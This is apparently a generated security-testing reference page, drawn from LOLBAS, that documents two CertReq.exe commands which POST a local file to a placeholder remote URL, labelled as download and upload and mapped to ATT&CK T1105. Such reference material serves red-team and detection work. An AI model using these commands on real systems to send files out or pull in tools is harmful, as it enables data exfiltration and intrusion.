---
parsed_by: focuslocust
source: commands
type: generated
---
# CertReq Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## CertReq.exe

Tool page: [CertReq.exe](../../tools/windows/certreq.exe.md)

### Download file from Internet

```text
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE} {PATH:.txt}
```

Description:

Send the specified file (penultimate argument) to the specified URL via HTTP POST and save the response to the specified txt file (last argument).

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certreq.yml` |
| Evidence | Command preserved from source parser. |

### Upload

```text
CertReq -Post -config {REMOTEURL} {PATH_ABSOLUTE}
```

Description:

Send the specified file (last argument) to the specified URL via HTTP POST and show response in terminal.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSBinaries/Certreq.yml` |
| Evidence | Command preserved from source parser. |
